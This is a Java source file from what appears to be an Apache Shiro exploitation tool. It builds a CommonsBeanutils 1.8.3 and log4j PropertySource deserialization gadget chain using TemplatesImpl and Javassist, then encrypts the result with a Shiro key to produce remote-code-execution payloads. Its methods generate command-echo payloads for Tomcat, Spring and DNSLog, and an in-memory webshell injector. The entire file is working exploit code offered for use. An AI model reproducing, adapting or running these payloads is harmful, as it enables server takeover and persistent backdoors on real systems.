package com.y5neko.shiroexp.gadget;

import com.y5neko.shiroexp.echo.*;
import com.y5neko.shiroexp.payloads.MemshellLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * CommonsBeanutilsPropertySource_183 利用链
 * 结合 CBPropertySource 和 CB1_183：
 * 1. 使用 Javassist 动态修改 serialVersionUID
 * 2. 使用 log4j 的 PropertySource.Comparator
 * 兼容 commons-beanutils 1.8.3
 */
public class CommonsBeanutilsPropertySource_183 {

    /**
     * 自定义 ClassLoader 用于加载 Javassist 修改后的类
     */
    static class JavassistClassLoader extends ClassLoader {
        public Class<?> loadClass(CtClass ctClass) throws Exception {
            byte[] bytecode = ctClass.toBytecode();
            return defineClass(ctClass.getName(), bytecode, 0, bytecode.length);
        }
    }

    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 构造 CBPropertySource_183 链 payload
     * @param templatesImpl TemplatesImpl 对象
     * @return 反序列化 payload
     */
    private byte[] getPayload(TemplatesImpl templatesImpl) throws Exception {
        // 创建 PropertySource 匿名内部类实例
        PropertySource propertySource1 = new PropertySource() {
            @Override
            public int getPriority() {
                return 0;
            }
        };

        // 使用 Javassist 动态修改 BeanComparator 的 serialVersionUID
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");

        try {
            // 尝试删除原有的 serialVersionUID 字段
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        } catch (NotFoundException e) {
            // 字段不存在，忽略
        }

        // 添加新的 serialVersionUID（固定值以兼容不同版本）
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));

        // 使用自定义 ClassLoader 加载修改后的类
        final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();

        // 设置 comparator 为 PropertySource.Comparator
        setFieldValue(beanComparator, "comparator", new PropertySource.Comparator());

        // 创建 PriorityQueue
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);

        // 添加 PropertySource 对象
        queue.add(propertySource1);
        queue.add(propertySource1);

        // 通过反射替换 queue 内容为 TemplatesImpl 对象
        setFieldValue(queue, "queue", new Object[]{templatesImpl, templatesImpl});

        // 修改 property 为 outputProperties 以触发 getter
        setFieldValue(beanComparator, "property", "outputProperties");

        // 序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    /**
     * 生成回显 payload
     * @param echoType 回显类型
     * @param key 密钥
     * @return 加密后的 payload 字符串
     */
    public static String genEchoPayload(String echoType, String key) throws Exception {
        return genEchoPayload(echoType, key, "CBC");
    }

    /**
     * 生成回显payload（支持指定加密模式）
     * @param echoType 回显类型
     * @param key Shiro Key
     * @param cryptType 加密模式（"CBC" 或 "GCM"）
     * @return 加密后的payload字符串
     */
    public static String genEchoPayload(String echoType, String key, String cryptType) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 根据回显类型生成恶意类
        if (echoType.equals("TomcatEcho")) {
            TomcatEcho tomcatEcho = new TomcatEcho();
            ctClass = tomcatEcho.genPayload(pool);
        } else if (echoType.equals("SpringEcho")) {
            SpringEcho springEcho = new SpringEcho();
            ctClass = springEcho.genPayload(pool);
        } else if (echoType.equals("AllEcho")) {
            AllEcho allEcho = new AllEcho();
            ctClass = allEcho.genPayload(pool);
        } else if (echoType.equals("DNSLogEcho")) {
            // DNSLog 探测
            DNSLogEcho dnsLogEcho = new DNSLogEcho();
            ctClass = dnsLogEcho.genPayload(pool);
        } else {
            throw new Exception("不支持的回显类型: " + echoType);
        }

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 创建 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 生成反序列化 payload
        byte[] payload = new CommonsBeanutilsPropertySource_183().getPayload(templatesImpl);
        String data = Base64.getEncoder().encodeToString(payload);
        return Tools.encryptByType(key, data, cryptType);
    }

    /**
     * 生成内存马 payload
     * @param key 密钥
     * @return 加密后的 payload 字符串
     */
    public static String genMemPayload(String key) throws Exception {
        return genMemPayload(key, "CBC");
    }

    /**
     * 生成内存马payload（支持指定加密模式）
     * @param key Shiro Key
     * @param cryptType 加密模式（"CBC" 或 "GCM"）
     * @return 加密后的payload字符串
     */
    public static String genMemPayload(String key, String cryptType) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 使用 MemshellLoader 作为内存马注入器
        MemshellLoader memshellLoader = new MemshellLoader();
        ctClass = memshellLoader.genPayload(pool);

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 创建 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 生成反序列化 payload
        byte[] payload = new CommonsBeanutilsPropertySource_183().getPayload(templatesImpl);
        String data = Base64.getEncoder().encodeToString(payload);
        return Tools.encryptByType(key, data, cryptType);
    }
}
